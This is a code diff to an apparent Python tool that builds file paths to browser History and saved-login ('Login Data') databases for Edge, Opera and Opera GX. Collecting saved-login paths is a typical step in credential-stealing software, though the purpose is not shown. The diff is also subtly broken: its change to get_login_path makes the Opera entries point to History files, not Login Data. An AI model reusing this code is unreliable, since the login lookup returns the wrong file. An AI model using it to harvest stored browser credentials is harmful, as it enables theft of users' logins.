@@ -131,9 +131,9 @@ def get_history_path(browser):
     elif browser == "Edge":
         return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History")
     elif browser == "Opera":
-        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "History")
+        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Default", "History")
     elif browser == "Opera GX":
-        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "History")
+        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Default", "History")
     else:
         return None
 
@@ -215,9 +215,9 @@ def get_login_path(browser):
     elif browser == "Edge":
         return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
     elif browser == "Opera":
-        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")
+        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Default", "History")
     elif browser == "Opera GX":
-        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data")
+        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Default", "History")
     else:
         return None
 
